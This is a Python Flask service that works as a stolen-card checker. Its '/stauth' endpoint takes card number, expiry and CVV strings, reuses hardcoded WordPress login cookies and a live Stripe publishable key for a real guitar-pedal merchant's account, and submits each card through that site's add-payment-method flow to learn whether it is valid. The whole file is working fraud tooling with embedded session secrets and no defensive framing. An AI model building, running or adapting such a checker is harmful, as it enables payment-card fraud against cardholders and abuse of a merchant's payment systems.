from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

# ========== CONFIGURATION ==========
COOKIES = {
    'wordpress_sec_6a3ae81458afebc3533a2a615b353027': 'kinbbgbossagain%7C1776539591%7CughQ2lODZ2Y5LJLGE90exV5EJUNAazPZZhCDgpNTAfe%7Cc66915f585b0735b582dd6d4cb9c72a865e30f3d6605301a9e9e8550cb4771f5',
    'wordpress_logged_in_6a3ae81458afebc3533a2a615b353027': 'kinbbgbossagain%7C1776539591%7CughQ2lODZ2Y5LJLGE90exV5EJUNAazPZZhCDgpNTAfe%7C5a8047ffb8c45d6347731b2ced7afdcc7035bd41c7447849a8a9dffd916f530c',
    '__stripe_mid': '11e2b34c-c4f8-4517-b9f4-6be30a7ca77f76f71c',
    '__stripe_sid': '89890448-7b04-4ed2-9aaf-2a06a800ceb1e18908',
}

HEADERS_PAGE = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US',
    'referer': 'https://www.strymon.net/my-account/payment-methods/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
}

HEADERS_STRIPE = {
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
}

HEADERS_AJAX = {
    'accept': '*/*',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.strymon.net',
    'referer': 'https://www.strymon.net/my-account/add-payment-method/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

def parse_card_details(card_string):
    """Parse card string in format: CC|MM|YY|CVV or CC|MM|YY or CC|MM|YY|CVV"""
    parts = card_string.split('|')
    
    if len(parts) >= 3:
        card_number = parts[0].replace(' ', '').replace('-', '')
        exp_month = parts[1].zfill(2)
        exp_year = parts[2]
        
        # Handle 2-digit year (26 -> 2026, but Stripe needs 26 or 2026?)
        if len(exp_year) == 2:
            exp_year = exp_year
        
        cvv = parts[3] if len(parts) >= 4 else '123'
        
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvv': cvv
        }
    else:
        return None

def get_nonces():
    """Extract both nonces from the page"""
    response = requests.get('https://www.strymon.net/my-account/add-payment-method/', 
                           cookies=COOKIES, 
                           headers=HEADERS_PAGE)
    
    if response.status_code != 200:
        return None, None
    
    checkout_nonce_match = re.search(r'"createCheckoutSessionNonce":"([^"]+)"', response.text)
    ajax_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
    
    checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else None
    ajax_nonce = ajax_nonce_match.group(1) if ajax_nonce_match else None
    
    return checkout_nonce, ajax_nonce

def create_stripe_payment_method(card_details):
    """Create payment method in Stripe"""
    stripe_data = f'type=card&card[number]={card_details["number"]}&card[cvc]={card_details["cvv"]}&card[exp_year]={card_details["exp_year"]}&card[exp_month]={card_details["exp_month"]}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6f8494a281%3B+stripe-js-v3%2F6f8494a281%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.strymon.net&time_on_page=42341&client_attribution_metadata[client_session_id]=c4ebef05-119f-4e09-9180-e99f75dff3ff&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1ETKAW8GsA1&client_attribution_metadata[elements_session_config_id]=3f36629e-3a79-4323-bca5-06c46b3daefb&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=96cf39f6-3cee-4008-ba82-c50e9f1d144060102f&muid=11e2b34c-c4f8-4517-b9f4-6be30a7ca77f76f71c&sid=89890448-7b04-4ed2-9aaf-2a06a800ceb1e18908&key=pk_live_51KgGVGAoMZ1qjkrWI1y0fQ2e4xAwNwDMuTVGeF9TA4GSTqGZCnJhZJxUeBFXW8hzUI6UiRqKKpNUZyMUMjwkYjGg00rdwxmApR&_stripe_version=2025-09-30.clover'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', 
                            headers=HEADERS_STRIPE, 
                            data=stripe_data)
    
    if response.status_code == 200:
        return response.json().get('id')
    return None

def attach_payment_method(payment_method_id, ajax_nonce):
    """Attach payment method to WordPress account"""
    ajax_data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    
    response = requests.post('https://www.strymon.net/wp-admin/admin-ajax.php',
                            cookies=COOKIES,
                            headers=HEADERS_AJAX,
                            data=ajax_data)
    
    return response.json()

@app.route('/stauth', methods=['GET', 'POST'])
def stauth():
    """Main API endpoint"""
    # Get card details from query parameter or form data
    if request.method == 'GET':
        card_param = request.args.get('cc')
    else:
        card_param = request.form.get('cc')
    
    if not card_param:
        return jsonify({
            'success': False,
            'error': 'Missing card parameter. Use format: ?cc=CC|MM|YY|CVV'
        }), 400
    
    # Parse card details
    card_details = parse_card_details(card_param)
    if not card_details:
        return jsonify({
            'success': False,
            'error': 'Invalid card format. Use: CC|MM|YY|CVV (e.g., 4400430268343784|02|26|232)'
        }), 400
    
    # Get nonces
    checkout_nonce, ajax_nonce = get_nonces()
    if not ajax_nonce:
        return jsonify({
            'success': False,
            'error': 'Failed to fetch nonces. Session may be expired.'
        }), 500
    
    # Create payment method in Stripe
    payment_method_id = create_stripe_payment_method(card_details)
    if not payment_method_id:
        return jsonify({
            'success': False,
            'error': 'Failed to create payment method in Stripe. Card may be invalid.'
        }), 400
    
    # Attach to WordPress
    result = attach_payment_method(payment_method_id, ajax_nonce)
    
    # Return response exactly as received from WordPress
    return jsonify({
        'success': result.get('success', False),
        'payment_method_id': payment_method_id,
        'response': result,
        'card_details': {
            'last4': card_details['number'][-4:],
            'expiry': f"{card_details['exp_month']}/{card_details['exp_year']}"
        }
    })

@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
